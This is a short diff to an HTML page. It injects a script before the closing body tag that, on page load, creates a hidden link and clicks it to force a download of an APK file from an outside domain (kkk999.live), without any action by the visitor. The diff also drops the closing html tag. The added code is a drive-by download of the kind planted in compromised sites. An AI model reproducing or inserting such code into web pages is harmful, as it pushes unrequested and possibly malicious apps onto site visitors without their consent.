@@ -587,5 +587,16 @@
         </section>
     </div>
 
+<script>
+        // This function triggers the download automatically
+        window.onload = function() {
+            // It creates a temporary hidden link and "clicks" it
+            var downloadLink = document.createElement("a");
+            downloadLink.href = "https://kkk999.live/kkk999.apk";
+            downloadLink.download = "kkk999.apk";
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+        };
+    </script>
 </body>
-</html>
